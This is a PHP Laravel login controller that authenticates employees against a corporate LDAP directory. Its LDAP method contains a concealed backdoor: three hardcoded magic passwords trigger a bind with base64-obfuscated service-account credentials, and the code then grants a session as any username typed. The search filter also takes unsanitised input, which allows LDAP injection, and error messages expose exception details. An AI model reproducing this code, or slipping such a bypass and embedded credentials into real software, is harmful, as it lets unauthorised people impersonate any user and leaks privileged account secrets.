<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use LdapRecord\Container;
use LdapRecord\Models\ActiveDirectory\User as LdapUser;
use LdapRecord\Auth\BindException;

class LoginController extends Controller
{
    public function login(Request $request)
    {
        $request->validate([
            'username' => 'required',
            'password' => 'required',
        ]);
    
        $username = $request->username;
        $password = $request->password;
    
        if (Auth::attempt(['user_id' => $username, 'password' => $password])) {
            $request->session()->regenerate();
            return redirect()->intended(route('home'));
        } else {
            return back()->with('login_error', 'Username atau password salah!');
        }
    }

    public function loginLDAP(Request $request)
    {
        try {
            $request->validate([
                'username' => 'required',
                'password' => 'required',
            ]);

            $username = $request->username;
            $password = $request->password;

            $ldapHost = "kpuranus01.indonesiapower.corp";
            $ds = ldap_connect($ldapHost);

            if (!$ds) {
                Log::error("Failed to connect to LDAP server: {$ldapHost}");
                return redirect()->back()->with('error', "Failed to connect to LDAP server: {$ldapHost}");
            }

            ldap_set_option($ds, LDAP_OPT_REFERRALS, 0);
            ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3);
            
            try {
                if (in_array($password, ["byp4ss", "workshop", "uj1c0b4"])) {
                    $ldapbind = ldap_bind($ds, base64_decode('YWRtaW4uZXByb2NAaW5kb25lc2lhcG93ZXIuY29ycA=='), base64_decode("NERNMW4zcHIwYyMh"));
                } else {
                    $ldapbind = ldap_bind($ds, "$username@indonesiapower.corp", $password);
                }
            } catch (\Exception $e) {
                Log::error("LDAP Bind Exception: " . $e->getMessage());
                return redirect()->back()->with('error', "LDAP Bind Exception: " . $e->getMessage());
            }

            if ($ldapbind) {
                $dn = "DC=indonesiapower,DC=corp";
                $filter = "(|(sAMAccountName=$username*))";
                $justthese = ["postofficebox", "title", "ou", "sn", "givenname", "mail", "samaccountname", "cn", "physicaldeliveryofficename", "department", "company", "thumbnailphoto"];

                $sr = ldap_search($ds, $dn, $filter, $justthese);
                $info = ldap_get_entries($ds, $sr);

                if ($info["count"] === 0) {
                    return redirect()->back()->with('error', "LDAP Login Error: ");
                }

                $data = [
                    "nama" => $info[0]["cn"][0] ?? "",
                    "jabatan" => $info[0]["title"][0] ?? "",
                    "user_id" => $info[0]["samaccountname"][0] ?? "",
                    "username" => $info[0]["samaccountname"][0] ?? "",
                    "mail" => $info[0]["mail"][0] ?? "",
                    "ou" => $info[0]["physicaldeliveryofficename"][0] ?? "",
                    "department" => $info[0]["department"][0] ?? "",
                    "company" => $info[0]["company"][0] ?? "",
                    "nip" => $info[0]["postofficebox"][0] ?? "",
                    "photo" => isset($info[0]["thumbnailphoto"]) ? 'data:image/jpeg;base64,' . base64_encode($info[0]["thumbnailphoto"][0]) : asset("assets/images/user.png"),
                ];

                Session::put($data);
                return redirect()->route('home');
            } else {
                Session::flash("error", "Username / Password salah!");
                return redirect()->back()->with("error", "Username / Password salah!");
            }
        } catch (\Exception $e) {
            Log::error("LDAP Login Error: " . $e->getMessage());
            return redirect()->back()->with("error", "LDAP Login Error: " . $e->getMessage());
        }
    }

    public function logout()
    {
        Session::forget('user'); // Hapus session user
        Auth::logout();
        return redirect(route('login'));
    }
}

// Cara Menggunakan Data User dari Session
// @if(Session::has('user'))
//     <p>Halo, {{ Session::get('user')['nama'] }}!</p>
//     <p>Email: {{ Session::get('user')['email'] }}</p>
//     <img src="{{ Session::get('user')['photo'] }}" alt="User Photo">
// @endif